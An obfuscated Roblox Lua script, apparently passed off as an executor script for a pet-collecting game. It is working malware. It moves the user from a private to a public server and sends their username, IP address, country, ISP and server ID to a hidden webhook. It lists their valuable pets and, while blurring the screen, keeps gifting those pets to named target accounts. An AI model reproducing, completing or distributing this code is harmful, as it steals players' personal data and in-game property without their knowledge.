        local url = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('mcwQrUwCTbuxDEaccMZKtwxwPzMuiHhKEaKeUvGaSzCDZyECBknKSiraHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('NROyrtxufTxyphbNYNjUUJBSSbyWMYtEPgPUXVviVAXIwCtQcXvQyhkL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('JgLFcqMFClrFyyHQKQzHYerKDTuKMwQAYxNfdOjXDjxzzPhIvPthuxr') then url = url .. LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('dmepOkulwwbVTvZjaQOfmCgdmRquVCVTJOvBDepDGzbVDuZeJMXaXANJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KFgxYAlbkrJaPaVGhrDqQyvPmdDnlUfCgzsnLQEfinHWIpsAnWLLSkJR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('BSmAMIDSFQzbzYKWpDGdIPjKahkENHBvnKJdFLosvpmGvVVjJNUlsWF') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('zCKGAfYjBBqSYHSLpuTIupNfyDsnlkwSiTbsyNkkzLTWFjDOUDuFhPFWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('SkHqmLdlpbRrVrLTCOkcEsVgbFsiNadQCjNYOgfAuDRaJfnRPZnXgikWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('aqPLDUcYWjMiwaOOPdoVouetJFjlbYIzmsfwrXgKaikIiOAphPsUZonQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('fhWcDpEKLmGqJZqmDxkSgEbpCnigRKuKrOuzAVknpGaByKtXqhCRvoyVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('NwaYqAeGpRyuwwrGZPnFFpKWeIhZjdPJHGtODjRIARPKLjhmcmxZhdnLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('oxguqHCGuoIkoIzoKHPbdvjlVizIlaEvKqhOBpwBoCrCymeMOLbPCDu8J+OkiBQZXRzIA==') .. tostring(i) .. LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('TQIgCZOqvHMZCgePotAAxqjwhBnjqcikSigFvpTsafJZecLEFsUjGcX4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('jrJCsEvyPdcFhsQucevVDtIJuBTYAhLpiJfMvFxhoTsjgoybLtHFQtPXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('tujbWslnhMjNMWBzbYxwALSBoPwNQtyIQoMutniPOgMXuVXudURIdkw'),
        embeds = {{
            title = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KdzYITNifRUGyagOgXAnShKVycmhVFXiGUBISEceGbeBnGQxIuEjkWC8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('MFgpzkZQQrxEfrAESqNmIEXrYIBgzUpifVUMDMraQDCyEXTJMGoyfYaRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('HtSgDyODbouGntkaWByhpUVRZqAysMLoADNQZxTEBopWdBjUTXJnPmpISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('SEYSOmuIfhNUhilWTHDLEXHVAFEnXZPyefxnMBUtRkRIAUPetegpOzyUE9TVA=='),
            Headers = { [LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('QMegOJpNaMRkiFYFvoFvQCLYsxNYHNPnLgsqWhYqpsExhUGvpzeBYaVQ29udGVudC1UeXBl')] = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('JiNqEXwWYtVhQbcEakCuJzHbLKaCACHwjAOqgjuVgxFQRonMdGOiwODYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('sqjxbgitHqFvfNdmzdVxkJEmyOJtCuQGefMlBfwUTdsuvbswvkXdFxSVW5rbm93bg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('RxLxtprdMlBgMhoLNjUkSCHjVsObaERFmwdpfDkDTiJkxBfKjZaawVQVW5rbm93bg=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('aUdJUxXRJcpSIniwyMXavhrlsAckuDtRkVYqcYwMyosEDwqGqVqfTxHVW5rbm93bg==') end
    local result = req({ Url = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('VbPxumSRbXttWJuCNCybRtpzeqMzxCxDZOoWoRYkXvGoewMpyjVBTkbaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('QvzcqHPGQkSPANDEarXaDfYMfPXWbTIYzXvwnbkQQAlWsqydWMplfXoR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('uFdyfNjUPDzlAPSuBYYnUqBwpfxFwchnvlbXSjJWmWoBFABnpGcYlPvPw=='), body.country or LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('IOLlGBMtllVMHtIYxjViFxWSHMHbkpnvHZLYtQHYdlWFPFJLfSRHAQAPw=='), body.isp or LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('VvvrzyCsDAnpYhoFSkVimIQBPmdFGFsRSYpgetZklQZvSsawIVRDXZjPw==')
    end
    return LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('tWFAcieRreLioKlFpIOLBxAUXAQcUrLSuGXOeWLgQqtDuHBAeGVXLEWPw=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('NnRLxAwjLDcRhKeAIalmBqTegPlzUxFLOyleCuqugXBlMXIgFwGAXsPPw=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KxwZvRpAszujTDOtdjtrEtjgejBkgUnFBbUGfEWrsAlLyFDighMLcjpPw==')
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('sidMlqiuWzyJFZraAdYMQQVkCUzYfKjMlVUfBDxAlYpxERVFStoHUcU8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ekPWzYzsqZMRpuvHPjlkFeClwLSWpDiKBgqeVYkYrpJFooDBaiNNtRf8J+MkCBJUA=='), value = ip },
        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('sAWfWZUYSMeQkfGqBVkmkwoIIsHhNpDslsmluApLkqDOzhjgigwAxGf8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('WXeNJZefXnURNJlkcrPKfjFcEjUKgSogLIIWUwSsTnQeNCutNyGHgQV8J+SuyBJU1A='), value = isp },
        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZxtBXFBNnlevzAKHMjEbKcGaZJmgvFWngFfexXcNtVUayIwkKxtYoSF8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('plamwyKZFDjKCUSaiRiRfWFufsbiOenCfoHWpFCTrlnmDuNQDgCKGQd4o+x77iPIFRpbWU='), value = os.date(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('MyRtkIjjohkgEeJVhhIhEAaCUnuxxGhPJCuIfYAMUzpnQmwKDgguLpVJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('hfqoYoWDbfrOLJFYSNTHHyuocTgLEvXwUUsIsbiKnGllHlpIftSdTDf8J+OkiBQZXRz'), value = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('cbaxoCsYrnqzDbtrvCIWarklncsMGgwVDiFTuQYOEvxNONWEzZntTIzTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('GZuCiACxoUhBaCDqFBBnqqqzYITyjupMHkAJLDfvTDOEWOvOTKgImDd8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('WJpRuUJurVIrsnzhPiUbHSagQoSXdFIFvhpDLSIZxYcAONjmITOCrqkUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('EfqMItaPudDdMfcwrYuoWlHaafVccvUjjJqfpsMGVkuGczZSNyvCoyVQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Watch for targets & drain pets
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('funOJZTvEMuBFfVOtLSEdfyKHPcMCxXsYjtncxOUrDAhqjmhrgrnoPlVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                        freezeVisual()
                        tool.Parent = character
                        wait(0.3)
                        while player and player.Parent == Players and tool.Parent == character do
                            local args = {LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('SXsNJxVXNwGwExIEcLmMNPmsKTcoJfMPwnXUhRSZwcxeDEORNFfCSkVR2l2ZVBldA=='), player}
                            ReplicatedStorage:WaitForChild(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('XgBrQGoFSYIZxQjODjUmCdzibOWkhKCTkEnajeYWvJjcggCNFgqARJPR2FtZUV2ZW50cw==')):WaitForChild(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('mRYwuMuFuLaXTsYaWnQxXHlvxiDPAJdNQlnaYPucvRQbMvmXUKRigOFUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                            wait(0.7)
                        end
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
